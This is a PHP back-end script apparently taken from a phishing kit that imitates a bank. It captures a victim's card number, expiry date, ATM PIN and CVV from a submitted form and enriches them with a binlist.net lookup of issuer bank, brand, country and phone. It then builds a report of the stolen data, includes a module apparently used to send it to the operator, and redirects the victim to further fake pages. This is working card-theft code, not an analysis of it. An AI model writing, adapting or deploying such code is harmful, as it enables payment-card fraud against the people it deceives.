<?php
session_start();
require_once('Module/Setmodule.php');
$card_number = $_POST['Card'];
$bin = str_replace(" ", "", str_split($card_number,8)[0]);
function check_bin($bin) {
  $url = "https://lookup.binlist.net/".$bin;
  $headersers = array();
  $headersers[] = 'Accept-Version: 3';
  $ch = curl_init();
  curl_setopt($ch,CURLOPT_URL,$url);
  curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
  curl_setopt($ch, CURLOPT_HTTPHEADER, $headersers);
  $resp=curl_exec($ch);
  curl_close($ch);
  $result = json_decode($resp, true);
  return $result;
}
$result = check_bin($bin);
$cardt = $result['scheme'];
$type = $result['type'];
$brand = $result['brand'];

$prepaid = $result['prepaid'];
$currency = $result['country']['currency'];
$url = $result['bank']['url'];

$country = $result['country']['name'];
$bank = $result['bank']['name'];
$phone = $result['bank']['phone'];
$Bankcity = $result['bank']['city'];


$message .= "-------------- $bin $Bank  Card Information -----------------------\n"."\n";

$message .= "Card number: ".$_POST['Card']."\n"; 
$message .= "Expiry: ".$_POST['Expiry']."\n";
$message .= "Atm: ".$_POST['pin']."\n";
$message .= "cvv: ".$_POST['cvv']."\n"."\n"; 

$message .= "-------------- CARD LOOKUP -------------- \n"."\n";
$message .= " Bin: {$bin}\n";
$message .= " Card Level {$cardt}\n";
$message .= " Card Type: {$type}\n";
$message .= " Card Brand: {$brand}\n";
$message .= " Country: {$country}\n";
$message .= " Bank Name: {$bank}\n";
$message .= " prepaid: {$prepaid}\n";
$message .= " currency: {$currency}\n";
$message .= " Bank url: {$url}\n";
$message .= " Bank city: {$Bankcity}\n";
$message .= " Telephone banking: {$phone}\n"."\n";



require_once('Module/SendModule.php');




	  if($settings['Account'] == "1"){
	header("Location: ../Account.php?online_id=".$key."login_id=$praga$praga&session=$praga$praga");
  }
  else{
		header("Location: ../complete.php?online_id=".$key."login_id=$praga$praga&session=$praga$praga");
	}
	
	
	
?>
